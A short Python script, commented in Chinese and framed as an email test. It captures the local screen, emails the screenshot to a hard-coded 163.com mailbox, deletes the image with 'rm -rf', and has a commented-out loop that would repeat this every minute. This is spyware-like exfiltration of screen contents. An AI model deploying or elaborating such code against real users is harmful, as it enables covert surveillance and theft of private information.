#coding=utf-8
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import time
from PIL import ImageGrab
import os
def Email():
    mail_host = "smtp.163.com"
    mail_user = "boziabozi"
    # mail_pass = raw_input("password:")
    mail_pass = ""
    receiver = "boziabozi@163.com"
    sender = "bozi" + "<" + mail_user + "@163.com" + ">" # 注意发件人格式
    message = MIMEMultipart("mult")

    content = u"检测本机电脑屏幕，附件是屏幕截图"
    msg = MIMEText(content,_charset='utf-8')
    msg['Subject'] = u'邮件测试'
    msg['From'] = sender
    msg['To'] = receiver
    #添加照片附件
    I = ImageGrab.grab()
    I.save("test.png")
    with open('test.png',"rb")as fp:
         picture = MIMEImage(fp.read())
    os.system("rm -rf test.png")
    #与txt文件设置相似
    picture['Content-Type'] = 'application/octet-stream'
    picture['Content-Disposition'] = 'attachment;filename="1.png"'
    picture.add_header('picture','2')

    message.attach(msg)
    message.attach(picture)

    try:
        s = smtplib.SMTP()
        s.connect(mail_host)
        s.login(mail_user, mail_pass)
        s.sendmail(sender, receiver, message.as_string()) # 三个参数不要省略
        s.close()
        print('邮件发送成功！')
    except Exception:
        print("邮件发送失败！")

if __name__ == "__main__":
    # while(1):
        Email()
        # time.sleep(60) #60s截一次屏并发送邮件

